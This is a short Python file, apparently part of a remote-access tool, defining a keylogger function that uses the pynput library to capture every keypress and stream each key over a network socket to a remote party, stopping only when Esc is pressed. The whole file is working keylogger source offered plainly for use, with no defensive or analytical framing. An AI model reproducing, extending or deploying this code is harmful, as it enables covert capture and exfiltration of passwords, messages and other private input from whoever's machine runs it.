from pynput import keyboard

def start_keylogger(client_socket):
    def on_press(key):
        try:
            key_str = f'{key.char}'
        except AttributeError:
            key_str = f' {str(key)} '

        if (client_socket):
            try:
                client_socket.sendall(key_str.encode("utf-8"))
            except Exception as e:
                print(f'Error when sending data to client: {e}')

    def on_relaese(key):
        if (key == keyboard.Key.esc):
            print("Stopped keylogger...")
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_relaese) as listener: 
        listener.join()